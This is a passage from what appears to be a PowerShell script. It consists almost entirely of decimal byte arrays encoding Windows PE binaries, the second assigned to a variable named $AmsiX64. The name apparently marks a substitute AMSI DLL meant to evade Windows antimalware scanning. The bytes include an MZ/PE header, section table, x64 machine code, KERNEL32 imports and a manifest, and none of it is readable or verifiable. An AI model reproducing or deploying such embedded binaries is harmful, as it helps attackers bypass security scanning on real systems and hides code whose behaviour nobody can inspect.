101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\"\n$AmsiX64 = \"77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 